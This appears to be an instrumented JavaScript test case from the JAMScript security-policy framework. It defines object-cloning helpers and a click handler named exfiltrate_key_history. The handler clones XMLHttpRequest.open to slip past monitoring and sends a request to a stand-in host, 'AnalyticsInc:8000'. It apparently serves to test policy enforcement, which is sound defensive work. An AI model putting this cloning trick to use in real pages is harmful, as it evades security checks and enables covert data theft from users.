function clone(obj$$16) {
  var v11 = obj$$16 == null;
  var v19 = !v11;
  if(v19) {
    var v18 = typeof obj$$16;
    v11 = v18 != "object"
  }
  var v0 = v11;
  if(v0) {
    return obj$$16
  }
  var temp = {};
  var key$$14;
  for(key$$14 in obj$$16) {
    var v1 = temp;
    var v2 = key$$14;
    introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074) {
      var v12 = obj$$16[key$$14]
    }
    var v28 = clone(v12);
    JAMScript.set(v1, v2, v28)
  }
  return temp
}
function clone2(obj$$17) {
  var v3 = obj$$17.cloneNode;
  if(v3) {
    return obj$$17.cloneNode(true)
  }
  var v4;
  var v13 = obj$$17 instanceof Array;
  if(v13) {
    v4 = []
  }else {
    v4 = {}
  }
  var copy = v4;
  var attr;
  for(attr in obj$$17) {
    introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074) {
      var v23 = obj$$17[attr]
    }
    var v20 = typeof v23;
    var v14 = v20 == "function";
    var v22 = !v14;
    if(v22) {
      introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074) {
        var v24 = obj$$17[attr]
      }
      var v21 = v24 == null;
      var v26 = !v21;
      if(v26) {
        introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074) {
          var v27 = obj$$17[attr]
        }
        var v25 = v27.clone2;
        v21 = !v25
      }
      v14 = v21
    }
    var v8 = v14;
    if(v8) {
      JAMScript.set(copy, attr, obj$$17[attr], JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074)
    }else {
      introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074) {
        var v15 = obj$$17[attr]
      }
      var v7 = v15 == obj$$17;
      if(v7) {
        JAMScript.set(copy, attr, copy)
      }else {
        var v5 = copy;
        var v6 = attr;
        introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074) {
          var v16 = obj$$17[attr]
        }
        var v29 = JAMScript.call(v16.clone2, v16, []);
        JAMScript.set(v5, v6, v29)
      }
    }
  }
  return copy
}
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  var v9 = xmlhttp;
  introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074) {
    var v17 = xmlhttp.open
  }
  var v30 = clone(v17);
  v9.opennew = v30;
  JAMScript.call(xmlhttp.opennew, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone1", true]);
  xmlhttp.send(null);
  return
}
var v10 = document.getElementById("test");
JAMScript.set(v10, "onclick", exfiltrate_key_history);

